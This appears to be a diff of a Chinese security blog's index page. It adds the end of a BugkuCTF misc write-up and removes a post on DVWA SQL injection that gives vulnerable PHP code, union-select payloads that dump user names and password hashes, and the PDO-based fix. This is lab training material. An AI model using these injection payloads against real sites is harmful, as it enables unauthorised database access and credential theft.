+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-5.png" alt="10-5"></p>
+<p>放到Kali下，使用gunplot工具，画图</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-6.png" alt="10-6"></p>
+<p>画出一个二维码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/10-7.png" alt="10-7"></p>
+<p>扫描二维码得到flag</p>
+<hr>
+<h3 id="至此，21-30关的Write-up结束"><a href="#至此，21-30关的Write-up结束" class="headerlink" title="至此，21-30关的Write-up结束"></a>至此，21-30关的Write-up结束</h3><h3 id="后一部分链接：第31-40关Write-up"><a href="#后一部分链接：第31-40关Write-up" class="headerlink" title="后一部分链接：第31-40关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/07/BugKuCTF%E2%80%94%E6%9D%82%E9%A1%B9%E9%A2%98%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/07/BugKuCTF—杂项题 第21-30关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—Web题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1551,119 +1835,6 @@
 
 
   
-    <article id="post-DVWA 7-SQL Injection（SQL注入）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/16/DVWA 7-SQL Injection（SQL注入）/">DVWA 7-SQL Injection（SQL注入）</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/16/DVWA 7-SQL Injection（SQL注入）/" class="archive-article-date">
-  	<time datetime="2019-02-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\sqli\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>输入一个ID，返回该ID的信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-1.png" alt="7-1"></p>
-<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>源码中看出来对参数没有任何的处理，那我们就当黑盒测试一步步做（sqli-labs刷完了写的挺详细，所以这里简单写，不再赘述）</p>
-<p>①报错信息得知单引号包裹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;</span><br><span class="line"></span><br><span class="line">返回：your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p>②order by注出列数为2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br><span class="line"></span><br><span class="line">返回：Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure>
-<p>③union select返回成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,2#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname: 2</span><br></pre></td></tr></table></figure>
-<p>④注数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,database()#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname: dvwa</span><br></pre></td></tr></table></figure>
-<p>⑤注表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;dvwa&quot;#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname: guestbook,users</span><br></pre></td></tr></table></figure>
-<p>⑥注列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span><br></pre></td></tr></table></figure>
-<p>⑦注数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,group_concat(user,password) from users where user_id=1#</span><br><span class="line"></span><br><span class="line">返回：First name: 1；Surname:adminfae0b27c451c728867a567e8c1bb4e53</span><br></pre></td></tr></table></figure>
-<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	$id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id);</span><br><span class="line"></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Display values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>本难度中，使用了<code>mysqli_real_escape_string()</code>函数对传入的参数进行了处理，受影响的特殊字符有：<code>\x00,\n,\r,\,’,”,\x1a</code>。并且页面中，对参数的输入变成了下拉菜单，希望以此来控制用户的输入</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-2.png" alt="7-2"></p>
-<p>但是我们可以通过抓包，来改变传入的参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-3.png" alt="7-3"></p>
-<p><code>整形注入</code>，其他与前一难度一样了，不再赘述</p>
-<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>本难度提交方式又改变了，需要先点击<code>Click here to change your ID.</code>，然后才在弹出的边框中输入参数，源代码中对参数的获取也变成从<code>$_SESSION[]</code>这个全局数组获取</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/7-4.png" alt="7-4"></p>
-<p>与上一关一样，试着抓包修改参数，然后将返回的页面显示在浏览器上，发现返回的只是这个弹出的窗口，并没有有用信息，所以这样做还是有一定的防御作用的。但是这题没必要抓包，直接使用他提供的窗口进行注入就可以</p>
-<p>单引号包裹，其他与前面的一样，不再赘述</p>
-<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Was a number entered?</span></span><br><span class="line">	<span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">		<span class="comment">// Check the database</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line">		$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">		<span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">			<span class="comment">// Get values</span></span><br><span class="line">			$first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">			$last  = $row[ <span class="string">'last_name'</span> ];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for end user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>看了源码之后，发现这里的代码对查询语句的构造和之前的难度不一样了，这里用了<code>PDO</code>的<code>prepare()</code>、<code>bindParam()</code>、<code>execute()</code>三个函数来完成查询语句的构造和执行，关于讲解可以参考这篇文章：<a href="https://www.cnblogs.com/zhouguowei/p/5212994.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhouguowei/p/5212994.html</a></p>
-<p>PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性</p>
-<hr>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/120747.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/16/DVWA 7-SQL Injection（SQL注入）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
@@ -1777,11 +1948,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
               </li>
             
             <div class="clearfix"></div>
